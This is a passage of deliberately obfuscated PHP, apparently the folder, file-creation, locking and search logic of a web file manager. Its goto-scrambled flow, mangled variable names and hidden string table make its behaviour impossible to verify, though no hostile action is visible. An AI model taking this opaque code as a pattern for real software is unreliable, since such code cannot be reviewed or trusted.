$f‰–ë¼’–Ø); return $bíáËŸÙŸ; goto FöÃÚîÙÌê; FöÃÚîÙÌê: } private function _listSearchBindPinyin($A¬î«Õï‚¹, &$fâ„íòˆœ, &$DÊƒ¹‰›É) { goto ağ£­Ò˜Àã; b°¹¾£Öœ: foreach ($fâ„íòˆœ as $d”¨ÀËÚÅÅ => $c¸‘½õ‚×°) { $DÏê¤¼³Ç[$D©åËêô†³[1940] . $d”¨ÀËÚÅÅ] = $c¸‘½õ‚×°; } foreach ($fÅ•Üˆ»Üê as $A‚ô¡‹×²÷) { $DÏê¤¼³Ç[] = array($D©åËêô†³[1942] => $A‚ô¡‹×²÷, $D©åËêô†³[956] => $D©åËêô†³[1777], array($D©åËêô†³[1943] => $A‚ô¡‹×²÷, $D©åËêô†³[1944] => array($D©åËêô†³[7], array($D©åËêô†³[442], $D©åËêô†³[441])))); } $this->join($d´…Ó£¹éº); goto FÔéÙ±×Ñ; FÔéÙ±×Ñ: $fâ„íòˆœ = $DÏê¤¼³Ç; goto CÑÑÀóöŒŞ; EÂ¥õ‡Ò Ã: $DÊƒ¹‰›É = $D©åËêô†³[1940] . str_replace($D©åËêô†³[47], $D©åËêô†³[1941], $DÊƒ¹‰›É); $fÅ•Üˆ»Üê = $fâ„íòˆœ[$D©åËêô†³[28]]; unset($fâ„íòˆœ[$D©åËêô†³[28]]); goto b°¹¾£Öœ; ağ£­Ò˜Àã: $D©åËêô†³ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($A¬î«Õï‚¹[$D©åËêô†³[1773]]) || !$A¬î«Õï‚¹[$D©åËêô†³[1773]]) { return; } if (!Input::check($A¬î«Õï‚¹[$D©åËêô†³[1773]], $D©åËêô†³[315]) || strlen($A¬î«Õï‚¹[$D©åËêô†³[1773]]) < 2) { return; } goto DÆ†ÔÇÜÉ; DÆ†ÔÇÜÉ: $d´…Ó£¹éº = "\x4c\x45\x46\124\40\112\x4f\111\x4e\x20{$this->tablePrefix}\x69\x6f\137\163\157\x75\x72\143\145\x5f\155\145\164\x61\40\155\x65\164\x61\40\x6f\156\40\x73\x6f\165\x72\x63\x65\x2e\x73\x6f\165\x72\143\145\x49\104\x20\x3d\x20\155\x65\164\141\56\x73\x6f\165\x72\x63\x65\x49\x44"; $DÏê¤¼³Ç = array(); $DÊƒ¹‰›É = str_replace(array($D©åËêô†³[228], $D©åËêô†³[50], $D©åËêô†³[1939]), $D©åËêô†³[33], $DÊƒ¹‰›É); goto EÂ¥õ‡Ò Ã; CÑÑÀóöŒŞ: } private function _parseSearchWhere($Dø¢›ôÒ¦Ù) { goto D–‡Ğİ´; D–‡Ğİ´: $F÷ÄŞ¸ÄÅÃ =& $_SERVER[¬ı§†‰ú˜¼]; $dçƒë˜º¤· = array(); if (isset($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[722]]) && $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[722]]) { $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[84]] = array($F÷ÄŞ¸ÄÅÃ[1945], $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[722]]); } goto CÛµßŒ–ÕÀ; fÉÒ«œç´ô: if (isset($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[561]]) && $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[561]]) { $dçƒë˜º¤·[] = array($F÷ÄŞ¸ÄÅÃ[432] => $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[561]], $F÷ÄŞ¸ÄÅÃ[430] => $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[561]], $F÷ÄŞ¸ÄÅÃ[956] => $F÷ÄŞ¸ÄÅÃ[1777]); } if (isset($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[403]]) && $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[403]]) { $BÑ´Ùƒµ¼² = $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[403]]; if ($BÑ´Ùƒµ¼² == $F÷ÄŞ¸ÄÅÃ[77]) { $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[401]] = 1; } else { if ($BÑ´Ùƒµ¼² == $F÷ÄŞ¸ÄÅÃ[1948]) { $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[401]] = 0; } else { if ($BÑ´Ùƒµ¼²) { $BÑ´Ùƒµ¼² = is_array($BÑ´Ùƒµ¼²) ? $BÑ´Ùƒµ¼² : explode($F÷ÄŞ¸ÄÅÃ[47], $BÑ´Ùƒµ¼²); $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[403]] = array($F÷ÄŞ¸ÄÅÃ[409], $BÑ´Ùƒµ¼²); $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[401]] = 0; } } } } if (isset($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[476]]) && $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[476]]) { $FàîñĞºÛ§ = $this->sourceInfo($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[476]]); $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[552]] = array($F÷ÄŞ¸ÄÅÃ[511], $FàîñĞºÛ§[$F÷ÄŞ¸ÄÅÃ[485]] . $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[476]] . $F÷ÄŞ¸ÄÅÃ[512]); } goto aã°”‘‹Ç; aã°”‘‹Ç: if (isset($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[1773]]) && trim($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[1773]])) { $dóµİäÙ› = trim($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[1773]]); $dÍ‚ …ÂÔÊ = explode($F÷ÄŞ¸ÄÅÃ[50], $dóµİäÙ›); if (strlen($dóµİäÙ›) > 2 && (substr($dóµİäÙ›, 0, 1) == $F÷ÄŞ¸ÄÅÃ[116] && substr($dóµİäÙ›, -1) == $F÷ÄŞ¸ÄÅÃ[116]) || substr($dóµİäÙ›, 0, 1) == $F÷ÄŞ¸ÄÅÃ[55] && substr($dóµİäÙ›, -1) == $F÷ÄŞ¸ÄÅÃ[55]) { $dóµİäÙ› = substr($dóµİäÙ›, 1, -1); $dÍ‚ …ÂÔÊ = array($dóµİäÙ›); } $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[28]] = array(array($F÷ÄŞ¸ÄÅÃ[511], $F÷ÄŞ¸ÄÅÃ[1775] . $dóµİäÙ› . $F÷ÄŞ¸ÄÅÃ[1775])); if (count($dÍ‚ …ÂÔÊ) > 1) { $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[28]] = array(); foreach ($dÍ‚ …ÂÔÊ as $EáÚ†Ñ‘¦¶) { if (!trim($EáÚ†Ñ‘¦¶)) { continue; } $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[28]][] = array($F÷ÄŞ¸ÄÅÃ[511], $F÷ÄŞ¸ÄÅÃ[1775] . trim($EáÚ†Ñ‘¦¶) . $F÷ÄŞ¸ÄÅÃ[1775]); } } } return $dçƒë˜º¤·; goto DÛÓ®Ò‘¬Æ; CÛµßŒ–ÕÀ: if (isset($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[474]]) && $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[474]]) { $añ¢À’ÓÌÕ = array($F÷ÄŞ¸ÄÅÃ[1946], $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[474]]); if ($dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[84]]) { $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[84]] = array($dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[84]], $añ¢À’ÓÌÕ, $F÷ÄŞ¸ÄÅÃ[1947]); } else { $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[84]] = $añ¢À’ÓÌÕ; } } if (isset($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[1936]]) && $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[1936]] > 0) { $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[78]] = array($F÷ÄŞ¸ÄÅÃ[1945], $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[1936]]); } if (isset($Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[1937]]) && $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[1937]]) { $añ¢À’ÓÌÕ = array($F÷ÄŞ¸ÄÅÃ[1946], $Dø¢›ôÒ¦Ù[$F÷ÄŞ¸ÄÅÃ[1937]]); if ($dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[78]]) { $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[78]] = array($dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[78]], $añ¢À’ÓÌÕ, $F÷ÄŞ¸ÄÅÃ[1947]); } else { $dçƒë˜º¤·[$F÷ÄŞ¸ÄÅÃ[78]] = $añ¢À’ÓÌÕ; } } goto fÉÒ«œç´ô; DÛÓ®Ò‘¬Æ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($F·¤—ãŠÙÑ) { $f¹é¾ší§ =& $_SERVER[¬ı§†‰ú˜¼]; $Fí›‘ùÁ³¡ = Model($f¹é¾ší§[501])->where(array($f¹é¾ší§[1519] => $F·¤—ãŠÙÑ))->find(); $EàøÑ¥¶Í§ = $this->_mkdirRoot(SourceModel::TYPE_USER, $F·¤—ãŠÙÑ, $Fí›‘ùÁ³¡[$f¹é¾ší§[28]]); $this->userDesktopAdd($EàøÑ¥¶Í§); return $EàøÑ¥¶Í§; } public function userDesktopAdd($E Í»¤¡®) { $e¦÷£¿ºß‰ =& $_SERVER[¬ı§†‰ú˜¼]; $BôÒÏŸÑØ = LNG($e¦÷£¿ºß‰[1949]); $b§‘ˆùÈ• = $this->mkdir($E Í»¤¡®, $BôÒÏŸÑØ); $this->metaSet($b§‘ˆùÈ•, $e¦÷£¿ºß‰[1950], $e¦÷£¿ºß‰[87]); $this->metaSet($E Í»¤¡®, $e¦÷£¿ºß‰[1951], $b§‘ˆùÈ•); } public function groupRootAdd($Fº‘è—Ø¤İ) { $Fß©Æ»¶ =& $_SERVER[¬ı§†‰ú˜¼]; $DˆèäÂºœ‡ = Model($Fß©Æ»¶[484])->where(array($Fß©Æ»¶[1768] => $Fº‘è—Ø¤İ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Fº‘è—Ø¤İ, $DˆèäÂºœ‡[$Fß©Æ»¶[28]]); } public function systemRootPathAdd($eµºšø·àŒ) { if ($eµºšø·àŒ != $_SERVER[¬ı§†‰ú˜¼][504]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $eµºšø·àŒ); } public function userRootRemove($b‡³­ªÀ˜¢) { $Dâß©¶ÄÌ‚ = $this->sourceRoot(SourceModel::TYPE_USER, $b‡³­ªÀ˜¢); if (!$Dâß©¶ÄÌ‚) { return; } $this->remove($Dâß©¶ÄÌ‚, !1); } public function groupRootRemove($cÀ—„à‘¢) { $C¾õÜ£ = $this->sourceRoot(SourceModel::TYPE_GROUP, $cÀ—„à‘¢); if (!$C¾õÜ£) { return; } $this->remove($C¾õÜ£, !1); } private function _mkdirRoot($Fì’ô½ƒéÁ, $bÆóÖ»˜æŞ, $FÆ¥Ÿ¥Ä) { goto DĞ¿©ªÃ¥‡; c¨ÚïÂªö‰: CacheLock::unlock($B‚µœ‹Ê…­); return $cñ·º‡ÕŠ‹; goto fì´·ëÚä˜; b…š ®óò´: $cñ·º‡ÕŠ‹ = $this->add($Dğ³¦£ñ«ì); $eÃ•ÔÜ‹‚æ = array($DÖæÀ¾¥Ÿæ[554] => short_id($cñ·º‡ÕŠ‹)); $this->where(array($DÖæÀ¾¥Ÿæ[408] => $cñ·º‡ÕŠ‹))->save($eÃ•ÔÜ‹‚æ); goto c¨ÚïÂªö‰; DĞ¿©ªÃ¥‡: $DÖæÀ¾¥Ÿæ =& $_SERVER[¬ı§†‰ú˜¼]; $Dğ³¦£ñ«ì = array($DÖæÀ¾¥Ÿæ[393] => 0, $DÖæÀ¾¥Ÿæ[548] => $Fì’ô½ƒéÁ, $DÖæÀ¾¥Ÿæ[549] => $bÆóÖ»˜æŞ, $DÖæÀ¾¥Ÿæ[545] => 1, $DÖæÀ¾¥Ÿæ[550] => USER_ID, $DÖæÀ¾¥Ÿæ[551] => USER_ID, $DÖæÀ¾¥Ÿæ[546] => $DÖæÀ¾¥Ÿæ[33], $DÖæÀ¾¥Ÿæ[552] => $DÖæÀ¾¥Ÿæ[497], $DÖæÀ¾¥Ÿæ[420] => 0, $DÖæÀ¾¥Ÿæ[547] => 0, $DÖæÀ¾¥Ÿæ[446] => 0, $DÖæÀ¾¥Ÿæ[553] => $DÖæÀ¾¥Ÿæ[33]); if ($a•àóàôíŒ = $this->where($Dğ³¦£ñ«ì)->find()) { return $a•àóàôíŒ[$DÖæÀ¾¥Ÿæ[394]]; } goto cŸäÈÕ»; cŸäÈÕ»: $B‚µœ‹Ê…­ = "\115\x6f\x64\x65\x6c\x53\x6f\165\x72\143\145\x2e\155\x6b\x64\x69\x72\x52\157\x6f\164\56{$Fì’ô½ƒéÁ}\56{$bÆóÖ»˜æŞ}\x2e" . $FÆ¥Ÿ¥Ä; CacheLock::lock($B‚µœ‹Ê…­); $Dğ³¦£ñ«ì[$DÖæÀ¾¥Ÿæ[28]] = $FÆ¥Ÿ¥Ä; goto b…š ®óò´; fì´·ëÚä˜: } private function sourceRoot($BÄƒôÆöà, $Bõ™éÛÍ, $EÏÔÆÑ³…Ó = false) { $B‰èÕ®ºÏÈ =& $_SERVER[¬ı§†‰ú˜¼]; $CÀŠ’‘Ê¢š = array($B‰èÕ®ºÏÈ[393] => 0, $B‰èÕ®ºÏÈ[548] => $BÄƒôÆöà, $B‰èÕ®ºÏÈ[549] => $Bõ™éÛÍ); if ($aÅ¢êÉ¼± = $this->where($CÀŠ’‘Ê¢š)->find()) { return $EÏÔÆÑ³…Ó ? $aÅ¢êÉ¼± : $aÅ¢êÉ¼±[$B‰èÕ®ºÏÈ[394]]; } return !1; } public function sourceRootGroup($dùöÉíµ”ã) { goto b‹ª¡‘¢÷; f¼ê†ùŠ: return array_to_keyvalue($AÙ¯Â··š„[$D¤£ŞºÒ¼[75]], $D¤£ŞºÒ¼[482]); goto aŸŒ°òÁƒ; b‹ª¡‘¢÷: $D¤£ŞºÒ¼ =& $_SERVER[¬ı§†‰ú˜¼]; if (is_string($dùöÉíµ”ã)) { $dùöÉíµ”ã = array($dùöÉíµ”ã); } $B½ô×àÁóÜ = array($D¤£ŞºÒ¼[393] => 0, $D¤£ŞºÒ¼[548] => SourceModel::TYPE_GROUP, $D¤£ŞºÒ¼[549] => array($D¤£ŞºÒ¼[7], $dùöÉíµ”ã)); goto Fâ­ê‹ÇÏˆ; Fâ­ê‹ÇÏˆ: $this->selectPageReset(); $AÙ¯Â··š„ = $this->listSource($B½ô×àÁóÜ, 1000); $this->selectPageRestore(); goto f¼ê†ùŠ; aŸŒ°òÁƒ: } public function mkfile($BÙŠÙƒË‹, $c»êô¯ù®ï, $Aù¡¼†ŸÛ„ = '', $d¾Ç¹ÓŠŒó = REPEAT_RENAME) { $eŒ¸áÙºÑ =& $_SERVER[¬ı§†‰ú˜¼]; $FÑ‘•âœ˜â = Model($eŒ¸áÙºÑ[570])->addFileByContent($Aù¡¼†ŸÛ„, $c»êô¯ù®ï); return $this->_createFileCall($BÙŠÙƒË‹, $c»êô¯ù®ï, $FÑ‘•âœ˜â, $d¾Ç¹ÓŠŒó, $eŒ¸áÙºÑ[1214]); } public function addFile($DºâÀÓƒ‚µ, $Aœ×ìŸƒ¤ô, $Fˆî¡ÄÎµ, $B…§Ä»­õ× = false, $AÔà…åƒÑ¬ = REPEAT_RENAME) { $a†İ—¥Õ— = Model($_SERVER[¬ı§†‰ú˜¼][570])->addFile($Aœ×ìŸƒ¤ô, $Fˆî¡ÄÎµ, $B…§Ä»­õ×); return $this->_createFileCall($DºâÀÓƒ‚µ, $Fˆî¡ÄÎµ, $a†İ—¥Õ—, $AÔà…åƒÑ¬); } public function addFileByFileID($d†»É• , $eĞÕß‡ÆéŒ, $cå§ ğ˜Öº, $Føœ¶Ïáçˆ = REPEAT_RENAME) { $a®µí ¡‚ =& $_SERVER[¬ı§†‰ú˜¼]; $Eª¯òÛ„É§ = Model($a®µí ¡‚[570])->find($eĞÕß‡ÆéŒ); Model($a®µí ¡‚[570])->linkAdd($eĞÕß‡ÆéŒ); return $this->_createFileCall($d†»É• , $cå§ ğ˜Öº, $Eª¯òÛ„É§, $Føœ¶Ïáçˆ); } public function addFileByRemote($c›‚È¬µ‹ä, $bÄ±Û±ƒî, $CÒŒ“„Øƒ, $eÃÊ™êæ©‰ = array(), $b²è§«³‘ = REPEAT_RENAME) { $CôÔ¢ØÑ—ò = Model($_SERVER[¬ı§†‰ú˜¼][570])->addFileByRemote($bÄ±Û±ƒî, $CÒŒ“„Øƒ, $eÃÊ™êæ©‰); return $this->_createFileCall($c›‚È¬µ‹ä, $CÒŒ“„Øƒ, $CôÔ¢ØÑ—ò, $b²è§«³‘); } private function _createFileCall($eÔ£“áºœˆ, $eÑìğ™¢ÈÖ, $A³è¡ˆ‡Â‰, $fÛ ²¸‘¸®, $cÛ¾¡ÌÄ¨È = "\x75\x70\154\157\141\144") { goto Cš°…éˆ·¡; E—šÍé¢àÄ: $E”çåê¹¤÷ = $this->fileNameExist($eÔ£“áºœˆ, $eÑìğ™¢ÈÖ); $C‰¤ì…®Å = $this->_createFile($eÔ£“áºœˆ, $eÑìğ™¢ÈÖ, $A³è¡ˆ‡Â‰, $fÛ ²¸‘¸®, $f£ªàÖíå); if (!$f£ªàÖíå) { Model($F¢±¡®­–[448])->remove($A³è¡ˆ‡Â‰[$F¢±¡®­–[445]]); } goto Cğ¦åãå; Cš°…éˆ·¡: $F¢±¡®­– =& $_SERVER[¬ı§†‰ú˜¼]; $f£ªàÖíå = !1; $this->lockWriteStart($eÔ£“áºœˆ, $eÑìğ™¢ÈÖ); goto E—šÍé¢àÄ; Cğ¦åãå: if ($f£ªàÖíå && $C‰¤ì…®Å && $C‰¤ì…®Å != $E”çåê¹¤÷) { Model($F¢±¡®­–[1920])->eventCreate($C‰¤ì…®Å, $cÛ¾¡ÌÄ¨È); } $this->lockWriteEnd($eÔ£“áºœˆ, $eÑìğ™¢ÈÖ); return $C‰¤ì…®Å; goto cöãµ¡½Œ‹; cöãµ¡½Œ‹: } public function mkdir($D·¤ÇÜ¡Á‰, $c¾‹¸ì¹Ì, $eç…Ü†Îº” = REPEAT_SKIP) { goto BäĞ¹òŸË; b„’Ç¿ƒšõ: return $dõ´ï´’Å„; goto eé¼‹–¾ó; BäĞ¹òŸË: $fÍß¾ÑŸ«ª =& $_SERVER[¬ı§†‰ú˜¼]; $E‰‹Ôƒ Ñ = $this->sourceInfo($D·¤ÇÜ¡Á‰); if (!$E‰‹Ôƒ Ñ) { return !1; } goto AöŒø‡ğ™œ; eì¢ÌÄ …: $dõ´ï´’Å„ = $this->_addSoure($F²†ğ¤È, $E‰‹Ôƒ Ñ); Model($fÍß¾ÑŸ«ª[1920])->eventCreate($dõ´ï´’Å„, $fÍß¾ÑŸ«ª[1215]); $this->lockWriteEnd($D·¤ÇÜ¡Á‰, $c¾‹¸ì¹Ì); goto b„’Ç¿ƒšõ; AöŒø‡ğ™œ: $this->lockWriteStart($D·¤ÇÜ¡Á‰, $c¾‹¸ì¹Ì); if ($eç…Ü†Îº” !== !1) { $e’Ì²¾Ùà¶ = $this->fileNameExist($D·¤ÇÜ¡Á‰, $c¾‹¸ì¹Ì); if ($e’Ì²¾Ùà¶ && $eç…Ü†Îº” != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($D·¤ÇÜ¡Á‰, $c¾‹¸ì¹Ì); return $e’Ì²¾Ùà¶; } $c¾‹¸ì¹Ì = $this->fileNameAuto($D·¤ÇÜ¡Á‰, $c¾‹¸ì¹Ì, $eç…Ü†Îº”); } $F²†ğ¤È = array($fÍß¾ÑŸ«ª[545] => 1, $fÍß¾ÑŸ«ª[411] => $c¾‹¸ì¹Ì, $fÍß¾ÑŸ«ª[546] => $fÍß¾ÑŸ«ª[33], $fÍß¾ÑŸ«ª[446] => 0, $fÍß¾ÑŸ«ª[547] => 0); goto eì¢ÌÄ …; eé¼‹–¾ó: } private function _createFile($E¦Ô§Ô»Ìƒ, $d¬Øô„ÒáÌ, $a«›×«¼áñ, $BÎØçÀ–Ï­, &$C½š×Ö’ñÄ) { goto Dá‡Œ÷¾µˆ; f‘¢Öò‘³: $Cã“µ‚’“Ş = array($Bô«¡Å®À‘[545] => 0, $Bô«¡Å®À‘[411] => $d¬Øô„ÒáÌ, $Bô«¡Å®À‘[546] => substr(get_path_ext($d¬Øô„ÒáÌ), 0, 10), $Bô«¡Å®À‘[446] => $a«›×«¼áñ[$Bô«¡Å®À‘[445]], $Bô«¡Å®À‘[547] => $a«›×«¼áñ[$Bô«¡Å®À‘[78]]); $EËÙ‡‘ˆ™ = $this->_addSoure($Cã“µ‚’“Ş, $B÷ğ¦Ö³òÒ); $this->folderSizeReset($E¦Ô§Ô»Ìƒ, intval($Cã“µ‚’“Ş[$Bô«¡Å®À‘[78]])); goto a¦¤Ô’Ô­; Dá‡Œ÷¾µˆ: $Bô«¡Å®À‘ =& $_SERVER[¬ı§†‰ú˜¼]; $B÷ğ¦Ö³òÒ = $this->sourceInfo($E¦Ô§Ô»Ìƒ); if (!$a«›×«¼áñ || !$B÷ğ¦Ö³òÒ) { return !1; } goto E÷¥õ ‡£¿; a¦¤Ô’Ô­: return $EËÙ‡‘ˆ™; goto dø…®ÈÀ; E÷¥õ ‡£¿: if ($BÎØçÀ–Ï­ !== !1) { $EÍŠ¾‚å“‘ = $this->fileNameExist($E¦Ô§Ô»Ìƒ, $d¬Øô„ÒáÌ); } $C½š×Ö’ñÄ = !0; if ($BÎØçÀ–Ï­ && $EÍŠ¾‚å“‘) { if ($BÎØçÀ–Ï­ == REPEAT_SKIP) { $C½š×Ö’ñÄ = !1; return $EÍŠ¾‚å“‘; } else { if ($BÎØçÀ–Ï­ == REPEAT_REPLACE) { $eÛ±˜Ê ¬† = $this->sourceInfo($EÍŠ¾‚å“‘); $CÅğÀì¥‹Ş = $this->fileHistory($eÛ±˜Ê ¬†, $a«›×«¼áñ[$Bô«¡Å®À‘[445]], $a«›×«¼áñ[$Bô«¡Å®À‘[78]]); if (!$CÅğÀì¥‹Ş) { $C½š×Ö’ñÄ = !1; } else { $this->folderSizeReset($E¦Ô§Ô»Ìƒ); } return $EÍŠ¾‚å“‘; } else { $d¬Øô„ÒáÌ = $this->fileNameAuto($E¦Ô§Ô»Ìƒ, $d¬Øô„ÒáÌ, $BÎØçÀ–Ï­, !1); } } } goto f‘¢Öò‘³; dø…®ÈÀ: } protected function fileHistory($F¶Ÿ·ßÇÊÍ, $EÎŠíŠ “ƒ, $eØòÂŸ£ˆ©) { goto E¾ÇùÏ”˜; e²Ü¦„ìê: Model($böÀø‡÷â•[1952])->addHistory($F¶Ÿ·ßÇÊÍ); $BÏ‘ÒÈÂ¿ = array($böÀø‡÷â•[551] => USER_ID, $böÀø‡÷â•[415] => time(), $böÀø‡÷â•[445] => $EÎŠíŠ “ƒ, $böÀø‡÷â•[78] => $eØòÂŸ£ˆ©); $this->where(array($böÀø‡÷â•[408] => $F¶Ÿ·ßÇÊÍ[$böÀø‡÷â•[394]]))->save($BÏ‘ÒÈÂ¿); goto e”¤¹°…½ë; E¾ÇùÏ”˜: $böÀø‡÷â• =& $_SERVER[¬ı§†‰ú˜¼]; if ($F¶Ÿ·ßÇÊÍ[$böÀø‡÷â•[445]] == $EÎŠíŠ “ƒ) { return !1; } $this->checkLock($F¶Ÿ·ßÇÊÍ[$böÀø‡÷â•[394]], $EÎŠíŠ “ƒ); goto e²Ü¦„ìê; e”¤¹°…½ë: $this->sourceCacheClear($F¶Ÿ·ßÇÊÍ[$böÀø‡÷â•[394]]); return !0; goto CÜ™©Â„Ü; CÜ™©Â„Ü: } public function checkLock($F¿Š×ßçé, $aÒ…å¨Í¨) { goto b³¯‹ßÆ÷Œ; b³¯‹ßÆ÷Œ: $cŸé«æ›ÔÊ =& $_SERVER[¬ı§†‰ú˜¼]; $A…„Ê‚Ãá = $this->pathInfo($F¿Š×ßçé); if (!$this->fileIsLock($A…„Ê‚Ãá, !0)) { return; } goto dÃâƒ÷Å; dÃâƒ÷Å: $A²â„êâ½ = Session::get($cŸé«æ›ÔÊ[1953]); $c´ÄôÍ¶±ì = substr($A…„Ê‚Ãá[$cŸé«æ›ÔÊ[28]], 0, -1 - strlen($A…„Ê‚Ãá[$cŸé«æ›ÔÊ[168]])) . $cŸé«æ›ÔÊ[1480] . $A²â„êâ½ . $cŸé«æ›ÔÊ[95] . $A…„Ê‚Ãá[$cŸé«æ›ÔÊ[168]]; $D«´Ã¼Ù†Œ = Model($cŸé«æ›ÔÊ[570])->find($aÒ…å¨Í¨); goto e·‘ĞâÅœ; f¥ÏÛ£éô: show_json(LNG($cŸé«æ›ÔÊ[1955]) . $cŸé«æ›ÔÊ[1956] . LNG($cŸé«æ›ÔÊ[1957]) . $cŸé«æ›ÔÊ[1958] . $cµô‚—ç–æ . $cŸé«æ›ÔÊ[1959], !1); goto dÔ¸Ê×Šª«; e·‘ĞâÅœ: $this->_createFileCall($A…„Ê‚Ãá[$cŸé«æ›ÔÊ[476]], $c´ÄôÍ¶±ì, $D«´Ã¼Ù†Œ, REPEAT_REPLACE, $cŸé«æ›ÔÊ[1214]); $c‰¨Ñ¤–½À = $A…„Ê‚Ãá[$cŸé«æ›ÔÊ[443]][$cŸé«æ›ÔÊ[509]]; $cµô‚—ç–æ = $c‰¨Ñ¤–½À[$cŸé«æ›ÔÊ[1954]] ? $c‰¨Ñ¤–½À[$cŸé«æ›ÔÊ[1954]] : $c‰¨Ñ¤–½À[$cŸé«æ›ÔÊ[28]]; goto f¥ÏÛ£éô; dÔ¸Ê×Šª«: } public function fileIsLock($EìÍÏÀğÙ£, $aèæ³…š™ñ = false) { goto b‘‘æôá‚†; ašÛåìŒÕé: $B¬‘±¿‰æá = $GLOBALS[$aõêÇ—œÁÏ[6]][$aõêÇ—œÁÏ[88]][$aõêÇ—œÁÏ[507]]; if ($EìÍÏÀğÙ£[$aõêÇ—œÁÏ[443]][$aõêÇ—œÁÏ[508]] <= time() - $B¬‘±¿‰æá) { $this->metaSet($EìÍÏÀğÙ£[$aõêÇ—œÁÏ[394]], $aõêÇ—œÁÏ[506], null); $this->metaSet($EìÍÏÀğÙ£[$aõêÇ—œÁÏ[394]], $aõêÇ—œÁÏ[508], null); } if ($aèæ³…š™ñ) { $this->metaSet($EìÍÏÀğÙ£[$aõêÇ—œÁÏ[394]], $aõêÇ—œÁÏ[508], time()); } goto eî¨êÁ›Ñ; b‘‘æôá‚†: $aõêÇ—œÁÏ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($EìÍÏÀğÙ£[$aõêÇ—œÁÏ[443]]) || !$EìÍÏÀğÙ£[$aõêÇ—œÁÏ[443]][$aõêÇ—œÁÏ[506]]) { return !1; } if ($EìÍÏÀğÙ£[$aõêÇ—œÁÏ[443]][$aõêÇ—œÁÏ[506]] != USER_ID) { return !0; } goto ašÛåìŒÕé; eî¨êÁ›Ñ: return !1; goto b„ÎÅŠ— ‰; b„ÎÅŠ— ‰: } private function _addSoure($fŠÔˆôÍ­¹, $A±·×ğ·) { goto cêÍ š¶‹¹; aÄ³¹Äğ«: $this->updateModifyTime($fŠÔˆôÍ­¹[$eŞæ©œˆ¤[476]]); $a¤„é¤ó· = $eŞæ©œˆ¤[1960] . $A±·×ğ·[$eŞæ©œˆ¤[394]]; if (isset(self::$cacheChildList[$a¤„é¤ó·])) { unset(self::$cacheChildList[$a¤„é¤ó·]); } goto Dè•îÒ¼—Ş; aÎ¦©´¤î•: return $AÍ®õĞ…‡; goto a‘°‹å‡ˆÕ; CÊ¨ÒÚÎ£´: $aÅ×¨œŸƒ = array($eŞæ©œˆ¤[554] => short_id($AÍ®õĞ…‡)); $this->where(array($eŞæ©œˆ¤[408] => $AÍ®õĞ…‡))->save($aÅ×¨œŸƒ); $this->setNamePinyin($AÍ®õĞ…‡, $fŠÔˆôÍ­¹[$eŞæ©œˆ¤[28]]); goto aÎ¦©´¤î•; cêÍ š¶‹¹: $eŞæ©œˆ¤ =& $_SERVER[¬ı§†‰ú˜¼]; $fÊê¤Èœƒ  = array($eŞæ©œˆ¤[548] => $A±·×ğ·[$eŞæ©œˆ¤[402]], $eŞæ©œˆ¤[549] => $A±·×ğ·[$eŞæ©œˆ¤[482]], $eŞæ©œˆ¤[550] => USER_ID, $eŞæ©œˆ¤[551] => USER_ID, $eŞæ©œˆ¤[393] => $A±·×ğ·[$eŞæ©œˆ¤[394]], $eŞæ©œˆ¤[552] => $A±·×ğ·[$eŞæ©œˆ¤[485]] . $A±·×ğ·[$eŞæ©œˆ¤[394]] . $eŞæ©œˆ¤[47], $eŞæ©œˆ¤[420] => 0, $eŞæ©œˆ¤[553] => $eŞæ©œˆ¤[33]); $fŠÔˆôÍ­¹ 